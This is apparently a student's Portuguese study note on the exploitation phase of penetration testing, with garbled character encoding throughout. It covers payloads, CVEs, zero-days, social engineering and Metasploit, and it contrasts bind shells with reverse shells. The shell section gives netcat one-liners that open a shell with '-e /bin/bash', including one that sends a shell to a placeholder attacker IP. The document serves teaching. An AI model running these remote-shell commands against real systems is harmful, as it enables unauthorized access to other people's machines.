# Explotation

Explora as vunerabilidade encontradas, enviando um playload para a m√°quina alvo.
- Priorizamos a explora√ß√£o pela criticidade das vunerabilidades
- Um playload pode ser um programa ou uma shell
  - A shell conecta a m√°quina alvo permite executar comandos na m√°quiona alvo

Algumas vezes n√£o s√£o encontradas vunerabilidades que possam ser exploradas. Cintudo, isso n√£o indica que n√£o possam ocorres ataques exitosos. Nesses casos, o playload √© carregado atrav√©s de engenharia social.


**Sobre vunerabilidades:**
- CVE (Common Vulnerabilities and Exposures)
  - refer√™ncia universal para que fabricantes, pesquisadores e empresas falem a mesma ‚Äúl√≠ngua‚Äù quando tratam de vulnerabilidades.
  - Formato: CVE-ANO-N√öMERO
    - Exemplo: CVE-2017-0144 (EternalBlue, usado no ataque WannaCry).
- Zero-day vulnerability: falha de seguran√ßa desconhecida pelo fabricante ou pela comunidade de seguran√ßa.
  - N√£o documentada publicamente ‚Äì n√£o existe CVE ou alerta oficial ainda.
  - N√£o tem corre√ß√£o ‚Äì os fabricantes e usu√°rios n√£o podem se proteger com patch.
  - Alvo preferido de cibercriminosos e governos ‚Äì porque √© extremamente dif√≠cil de detectar e defender.
  - Alto valor de mercado ‚Äì exploits 0-day podem ser vendidos em mercados clandestinos (ou at√© mesmo para ag√™ncias governamentais).
  - Zero-day exploit: √© o c√≥digo ou t√©cnica que explora essa falha antes que exista um patch/corre√ß√£o dispon√≠vel.
- A vunerabilidade nem sempre √© t√©cnica, pode ser tamb√©m pessoas que utilizem uma rede.
  - A maioria dos ataques s√£o de explora√ß√£o de vunerabilidades de pessoas.

A principal ferramenta utilizada durante o explotation √© o **metasploit framework**.

## Reverse Shell e Bind Shell

### **Bind Shell**

* O atacante faz com que a m√°quina-alvo **abra uma porta e ‚Äúescute‚Äù conex√µes externas**.
* O atacante ent√£o se conecta diretamente a essa porta para obter acesso.
* **Fluxo:**
  * V√≠tima ‚Üí abre porta (servidor)
  * Atacante ‚Üí conecta na porta (cliente)
* Exemplo:
```
# Na v√≠tima
nc -lvp 4444 -e /bin/bash   # abre uma shell e espera conex√£o

# No atacante
nc <IP_da_v√≠tima> 4444
```

### **Reverse Shell**

* Ao inv√©s de escutar, a v√≠tima **abre uma conex√£o de sa√≠da** para o atacante.
* Muito usado em ambientes protegidos por firewall, onde a m√°quina n√£o aceita conex√µes externas, mas **pode sair para fora (outbound)**.
* **Fluxo:**
  * Atacante ‚Üí escuta em uma porta
  * V√≠tima ‚Üí conecta no atacante e envia a shell
* Exemplo:
```
# No atacante
nc -lvp 4444   # escuta esperando a shell

# Na v√≠tima
nc <IP_do_atacante> 4444 -e /bin/bash
```

### Compara√ß√£o

| Caracter√≠stica      | Bind Shell üñ•Ô∏è‚û°Ô∏è    | Reverse Shell ‚¨ÖÔ∏èüñ•Ô∏è                |
| ------------------- | ------------------- | ---------------------------------- |
| Quem abre a porta?  | V√≠tima (servidor)   | Atacante (servidor)                |
| Quem conecta?       | Atacante            | V√≠tima                             |
| Mais f√°cil em‚Ä¶      | Rede sem firewall   | Rede com firewall (sa√≠da liberada) |
| Risco para atacante | IP e porta expostos | Atacante fica oculto (escutando)   |

